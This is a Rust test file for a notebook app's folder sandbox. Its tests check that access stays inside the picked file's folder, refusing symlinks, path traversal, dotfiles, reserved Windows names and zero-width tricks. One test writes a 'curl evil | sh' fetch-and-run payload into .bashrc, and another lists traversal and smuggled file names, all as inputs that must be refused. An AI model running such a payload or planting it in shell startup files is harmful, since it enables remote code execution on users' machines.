// folder_fs.rs's tests: what a grant reaches, and what it never does.
use super::*;
use std::path::PathBuf;

fn dirs(name: &str) -> (PathBuf, PathBuf) {
    let base = std::env::temp_dir().join(format!("sb-folder-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    let (folder, outside) = (base.join("folder"), base.join("outside"));
    std::fs::create_dir_all(&folder).unwrap();
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("secret.txt"), "secret").unwrap();
    (folder, outside)
}

#[test]
fn a_grant_reaches_the_picked_file_and_its_folder() {
    let (folder, _) = dirs("grant");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    assert_eq!(g.name, "nb.ipynb");
    assert_eq!(g.folder, std::fs::canonicalize(&folder).unwrap());
    assert_eq!(read_own(&g).unwrap(), b"{}");
    write_own(&g, b"{\"cells\":[]}").unwrap();
    assert_eq!(std::fs::read(folder.join("nb.ipynb")).unwrap(), b"{\"cells\":[]}");
    // (a Save's file, not there yet: its folder's)
    let s = grant_for(&folder.join("new.ipynb")).unwrap();
    write_own(&s, b"saved").unwrap();
    assert_eq!(std::fs::read(folder.join("new.ipynb")).unwrap(), b"saved");
    assert!(grant_for(&folder).is_err(), "a folder isn't a file to grant");
    assert!(grant_for(&folder.join("missing").join("x.ipynb")).is_err(), "a Save into a folder that isn't there");
}

#[cfg(unix)]
#[test]
fn a_picked_link_is_the_file_it_points_at_and_a_link_put_there_later_is_refused() {
    let (folder, outside) = dirs("links");
    std::fs::write(outside.join("real.ipynb"), "real").unwrap();
    std::os::unix::fs::symlink(outside.join("real.ipynb"), folder.join("picked.ipynb")).unwrap();
    // (the person picked the link: the file it points at, in its own folder)
    let g = grant_for(&folder.join("picked.ipynb")).unwrap();
    assert_eq!(g.folder, std::fs::canonicalize(&outside).unwrap());
    assert_eq!(g.name, "real.ipynb");
    // (a link put at the picked name afterwards: never read or written through)
    std::fs::write(folder.join("nb.ipynb"), "mine").unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    std::fs::remove_file(folder.join("nb.ipynb")).unwrap();
    std::os::unix::fs::symlink(outside.join("secret.txt"), folder.join("nb.ipynb")).unwrap();
    assert!(read_own(&g).is_err());
    assert!(write_own(&g, b"overwritten").is_err());
    assert_eq!(std::fs::read(outside.join("secret.txt")).unwrap(), b"secret");
}

#[test]
fn the_files_beside_it_by_name_only() {
    let (folder, outside) = dirs("beside");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::fs::write(folder.join("data.csv"), "a,b").unwrap();
    std::fs::write(folder.join(".hidden"), "h").unwrap();
    std::fs::create_dir(folder.join("sub")).unwrap();
    std::fs::write(folder.join("sub").join("deep.txt"), "d").unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    let names: Vec<String> = list_beside(&g).unwrap().iter().map(|e| e["name"].as_str().unwrap().to_string()).collect();
    assert_eq!(names, vec!["data.csv"], "plain files only: not itself, a hidden file or a folder");
    assert_eq!(list_beside(&g).unwrap()[0]["size"], 3);
    assert_eq!(read_beside(&g, "data.csv").unwrap(), b"a,b");
    write_beside(&g, "out.txt", b"from Python").unwrap();
    assert_eq!(std::fs::read(folder.join("out.txt")).unwrap(), b"from Python");
    // (only one name in the folder: no path, no parent, nothing outside it)
    for bad in ["../outside/secret.txt", "sub/deep.txt", "..", ".", "", "a\\b", "c:x", "aux.txt", ".bashrc", ".hidden", ".profile", "GIT-CR~1", "GITCON~1.TXT", "\u{200C}.bashrc", "a\u{FEFF}b"] {
        assert!(read_beside(&g, bad).is_err(), "read {bad:?}");
        assert!(write_beside(&g, bad, b"x").is_err(), "write {bad:?}");
    }
    assert_eq!(std::fs::read(outside.join("secret.txt")).unwrap(), b"secret");
}

#[cfg(unix)]
#[test]
fn a_link_beside_it_is_never_followed() {
    let (folder, outside) = dirs("beside-links");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::os::unix::fs::symlink(outside.join("secret.txt"), folder.join("data.csv")).unwrap();
    std::os::unix::fs::symlink(&outside, folder.join("dir")).unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    assert!(list_beside(&g).unwrap().is_empty(), "links aren't listed");
    assert!(read_beside(&g, "data.csv").is_err(), "a link isn't read through");
    // (nor written through: refused, the file it points at untouched)
    assert!(write_beside(&g, "data.csv", b"from Python").is_err(), "a link isn't written through");
    assert_eq!(std::fs::read(outside.join("secret.txt")).unwrap(), b"secret");
    assert!(write_beside(&g, "dir/secret.txt", b"x").is_err());
    assert_eq!(std::fs::read(outside.join("secret.txt")).unwrap(), b"secret");
}

#[test]
fn a_hidden_file_beside_it_is_never_read_or_written() {
    // (a notebook in the home folder: .bashrc, .profile, .netrc beside it)
    let (folder, _) = dirs("hidden");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::fs::write(folder.join(".bashrc"), "mine").unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    assert!(read_beside(&g, ".bashrc").is_err());
    assert!(write_beside(&g, ".bashrc", b"curl evil | sh").is_err());
    assert!(write_beside(&g, ".zshrc", b"x").is_err());
    assert_eq!(std::fs::read(folder.join(".bashrc")).unwrap(), b"mine");
    assert!(!folder.join(".zshrc").exists());
}

#[cfg(unix)]
#[test]
fn a_write_keeps_the_file_s_permissions() {
    use std::os::unix::fs::PermissionsExt;
    let (folder, _) = dirs("perms");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::fs::write(folder.join("data.csv"), "a").unwrap();
    std::fs::set_permissions(folder.join("nb.ipynb"), std::fs::Permissions::from_mode(0o600)).unwrap();
    std::fs::set_permissions(folder.join("data.csv"), std::fs::Permissions::from_mode(0o640)).unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    write_own(&g, b"{\"x\":1}").unwrap();
    write_beside(&g, "data.csv", b"b").unwrap();
    assert_eq!(std::fs::metadata(folder.join("nb.ipynb")).unwrap().permissions().mode() & 0o777, 0o600);
    assert_eq!(std::fs::metadata(folder.join("data.csv")).unwrap().permissions().mode() & 0o777, 0o640);
    assert!(!std::fs::read_dir(&folder).unwrap().any(|d| d.unwrap().file_name().to_string_lossy().starts_with(".sbtmp-")), "no temporary file left");
}

#[test]
fn a_save_s_name_is_a_notebook_s() {
    assert_eq!(save_name("Lecture 3"), "Lecture 3.ipynb");
    assert_eq!(save_name("x.ipynb"), "x.ipynb");
    assert_eq!(save_name(".bashrc"), "bashrc.ipynb");
    assert_eq!(save_name("../../.profile"), "profile.ipynb");
    assert_eq!(save_name("a\\b\\c.IPYNB"), "c.IPYNB");
    assert_eq!(save_name(""), "notebook.ipynb");
    assert_eq!(as_notebook(PathBuf::from("/h/.bashrc")), PathBuf::from("/h/.bashrc.ipynb"));
    assert_eq!(as_notebook(PathBuf::from("/h/n.ipynb")), PathBuf::from("/h/n.ipynb"));
    assert_eq!(as_notebook(PathBuf::from("/h/n.IPYNB")), PathBuf::from("/h/n.IPYNB"));
}

#[test]
fn a_relative_path_is_the_current_folder_s() {
    let (folder, _) = dirs("relative");
    let here = std::env::current_dir().unwrap();
    std::env::set_current_dir(&folder).unwrap();
    let g = grant_for(std::path::Path::new("new.ipynb"));
    std::env::set_current_dir(here).unwrap();
    let g = g.unwrap();
    assert_eq!(g.folder, std::fs::canonicalize(&folder).unwrap());
    assert_eq!(g.name, "new.ipynb");
    assert!(shown(&g).ends_with("new.ipynb") && !shown(&g).starts_with(r"\\?\"));
}

#[cfg(unix)]
#[test]
fn a_read_only_file_is_never_replaced() {
    use std::os::unix::fs::PermissionsExt;
    let (folder, _) = dirs("readonly");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::fs::write(folder.join("ro.csv"), "kept").unwrap();
    std::fs::set_permissions(folder.join("ro.csv"), std::fs::Permissions::from_mode(0o444)).unwrap();
    std::fs::set_permissions(folder.join("nb.ipynb"), std::fs::Permissions::from_mode(0o444)).unwrap();
    // (as root, a 0444 file can be opened for writing: nothing to check)
    if std::fs::OpenOptions::new().write(true).open(folder.join("ro.csv")).is_ok() {
        return;
    }
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    assert!(write_beside(&g, "ro.csv", b"replaced").is_err());
    assert!(write_own(&g, b"replaced").is_err());
    assert_eq!(std::fs::read(folder.join("ro.csv")).unwrap(), b"kept");
    assert_eq!(std::fs::read(folder.join("nb.ipynb")).unwrap(), b"{}");
}

#[cfg(unix)]
#[test]
fn a_private_file_stays_private() {
    // (the file as written keeps its 0600; that the temporary file has it from its creation is by construction,
    // OpenOptionsExt::mode, not observed here)
    use std::os::unix::fs::PermissionsExt;
    let (folder, _) = dirs("tmpmode");
    std::fs::write(folder.join("nb.ipynb"), "{}").unwrap();
    std::fs::set_permissions(folder.join("nb.ipynb"), std::fs::Permissions::from_mode(0o600)).unwrap();
    let g = grant_for(&folder.join("nb.ipynb")).unwrap();
    write_own(&g, b"{}").unwrap();
    assert_eq!(std::fs::metadata(folder.join("nb.ipynb")).unwrap().permissions().mode() & 0o777, 0o600);
}
